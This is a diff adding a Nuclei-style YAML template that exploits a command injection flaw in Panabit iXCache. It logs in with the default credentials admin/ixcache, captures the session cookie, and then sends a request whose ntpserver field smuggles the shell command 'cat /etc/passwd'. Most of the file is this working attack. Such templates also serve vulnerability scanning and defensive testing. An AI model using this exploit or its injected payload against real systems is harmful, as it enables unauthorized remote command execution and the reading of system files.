@@ -1,0 +1,70 @@
+id: poc-yaml-panabit-ixcache-rce
+
+info:
+  name: Panabit iXCache Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits a command injection vulnerability in the Panabit iXCache to execute arbitrary commands.
+  tags: rce
+
+variables:
+  login_cookie: ''
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: login-verification
+    method: POST
+    path:
+      - "{{BaseURL}}/login/userverify.cgi"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=admin&password=ixcache"
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        group: 1
+        regex:
+          - "pauser_(.*?);Path=/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: headers
+        words:
+          - "Set-Cookie:"
+      - type: word
+        part: body
+        words:
+          - "CONTENT=\"0;URL=/cgi-bin/monitor.cgi\""
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "\"用户名或密码不对!\""
+
+  - id: execute-command
+    method: POST
+    path:
+      - "{{BaseURL}}/cgi-bin/Maintain/date_config"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: pauser_{{cookie}}
+    body: "ntpserver=0.0.0.0;cat /etc/passwd&year=2000&month=08&day=15&hour=16&minute=43&second=57&ifname="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+          - "<b>系统管理->系统时间</b>"
+          - "alert(\"操作成功!\");"
